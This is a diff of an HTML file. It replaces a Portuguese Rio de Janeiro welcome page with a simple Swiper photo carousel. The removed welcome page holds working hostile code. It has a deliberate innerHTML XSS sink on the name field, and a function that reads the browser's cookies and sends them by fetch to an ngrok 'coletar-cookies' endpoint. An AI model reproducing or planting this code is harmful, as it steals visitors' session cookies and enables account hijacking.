@@ -3,119 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Boas-Vindas - Rio de Janeiro</title>
+    <title>My Photos 22</title>
+    <!-- Swiper CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css">
     <style>
-        /* Estilos omitidos por brevidade */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            color: #000000;
+        }
+        header {
+            background-color: #0073e6;
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+        }
+        .search-bar {
+            margin-top: 10px;
+            text-align: center;
+        }
+        .search-bar input {
+            padding: 10px;
+            width: 300px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .search-bar button {
+            padding: 10px 20px;
+            background-color: #005bb5;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .swiper-container {
+            width: 100%;
+            height: 400px;
+            margin-top: 20px;
+        }
+        .swiper-slide {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .swiper-slide img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: cover;
+        }
+        footer {
+            background-color: #0073e6;
+            color: #ffffff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Página de Boas-Vindas -->
-    <div id="welcomePage" class="container">
-        <h1>Bem-vindo ao Rio de Janeiro! TANGO TILTEX</h1>
-        <p>Estamos felizes em ter você por aqui! Por favor, digite seu nome abaixo para começar.</p>
-        <input type="text" id="userName" placeholder="Digite seu nome aqui" oninput="handleInput(event)" onkeydown="checkEnter(event)">
-        <button onclick="submitName()">Enviar</button>
-        <p class="success-message hidden" id="successMessage">Nome recebido! Bem-vindo!</p>
-    </div>
-
-    <!-- Página Principal (Escondida inicialmente) -->
-    <div id="mainPage" class="hidden">
-        <header>
-            <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita</h1>
-        </header>
-
-        <div class="content">
-            <h2>Bem-vindo(a), <span id="userGreeting"></span>!</h2>
-            <p>
-                O Rio de Janeiro é uma grande cidade brasileira à beira-mar, famosa pelas praias de Copacabana e Ipanema, pela estátua de 38 metros de altura do Cristo Redentor, no topo do Corcovado, e pelo Pão de Açúcar, um pico de granito com teleféricos até seu cume. A cidade também é conhecida pelas grandes favelas. O empolgante Carnaval, com carros alegóricos, fantasias extravagantes e sambistas, é considerado o maior do mundo.
-            </p>
+    <header>
+        <h1>My Photos 22</h1>
+        <div class="search-bar">
+            <input type="text" id="search-input" placeholder="Pesquisar fotos...">
+            <button onclick="searchPhotos()">Buscar</button>
         </div>
+    </header>
 
-        <footer>
-            <p>&copy; 2023 Rio de Janeiro - Todos os direitos reservados.</p>
-        </footer>
+    <!-- Swiper Carrossel -->
+    <div class="swiper-container">
+        <div class="swiper-wrapper">
+            <div class="swiper-slide">
+                <img src="https://via.placeholder.com/800x400" alt="Foto 1">
+            </div>
+            <div class="swiper-slide">
+                <img src="https://via.placeholder.com/800x400" alt="Foto 2">
+            </div>
+            <div class="swiper-slide">
+                <img src="https://via.placeholder.com/800x400" alt="Foto 3">
+            </div>
+            <div class="swiper-slide">
+                <img src="https://via.placeholder.com/800x400" alt="Foto 4">
+            </div>
+            <div class="swiper-slide">
+                <img src="https://via.placeholder.com/800x400" alt="Foto 5">
+            </div>
+        </div>
+        <!-- Adicionar navegação do carrossel -->
+        <div class="swiper-button-next"></div>
+        <div class="swiper-button-prev"></div>
     </div>
 
+    <footer>
+        <p>&copy; 2023 My Photos 22. Todos os direitos reservados.</p>
+    </footer>
+
+    <!-- Swiper JS -->
+    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
     <script>
-        // Função chamada toda vez que o usuário digita algo
-        function handleInput(event) {
-            const userName = document.getElementById('userName').value;
-            // Exibindo o nome do usuário na página principal (XSS)
-            document.getElementById('userGreeting').innerHTML = userName;
+        // Inicializar o Swiper
+        const swiper = new Swiper('.swiper-container', {
+            loop: true,
+            navigation: {
+                nextEl: '.swiper-button-next',
+                prevEl: '.swiper-button-prev',
+            },
+        });
 
-            // Exibindo a mensagem de sucesso se o usuário estiver digitando
-            const successMessage = document.getElementById('successMessage');
-            if (userName.length > 0) {
-                successMessage.classList.remove('hidden');
-            } else {
-                successMessage.classList.add('hidden');
-            }
-
-            // A cada input, executa a vulnerabilidade XSS
-            console.log('Vulnerabilidade XSS ativa: ', userName);
-        }
-
-        // Verifica se o Enter foi pressionado e submete o nome
-        function checkEnter(event) {
-            if (event.key === "Enter") {
-                submitName();
-            }
-        }
-
-        // Envia o nome do usuário e troca para a página principal
-        function submitName() {
-            const userName = document.getElementById('userName').value;
-            // Exibindo o nome do usuário (XSS)
-            document.getElementById('userGreeting').innerHTML = userName;
-
-            // Exibindo a vulnerabilidade XSS em tempo real
-            console.log('Nome do usuário: ', userName);
-
-            // Enviar cookies para o servidor
-            sendCookiesToServer();
-
-            // Esconde a página de boas-vindas e mostra a página principal
-            document.getElementById('welcomePage').classList.add('hidden');
-            document.getElementById('mainPage').classList.remove('hidden');
-        }
-
-        // Função para capturar e enviar os cookies para o servidor
-        function sendCookiesToServer() {
-            const cookies = document.cookie;  // Captura os cookies do navegador
-            const url = 'https://ea2c-177-192-8-19.ngrok-free.app/coletar-cookies';  // URL do servidor
-
-            console.log("Cookies capturados:", cookies);
-
-            // Verificando se há cookies antes de enviar
-            if (!cookies) {
-                console.error("Nenhum cookie encontrado.");
-                return;
-            }
-
-            // Envia os cookies via fetch para o servidor
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin': '*' // Certifique-se de que o CORS esteja liberado
-                },
-                body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Falha ao enviar cookies');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Cookies enviados com sucesso!', data);
-            })
-            .catch(error => {
-                console.error('Erro ao enviar cookies:', error);
-            });
+        // Função de pesquisa (simulada)
+        function searchPhotos() {
+            const query = document.getElementById('search-input').value;
+            alert(`Você pesquisou por: ${query}`);
+            // Aqui você pode adicionar a lógica para buscar fotos reais
         }
     </script>
-
 </body>
 </html>
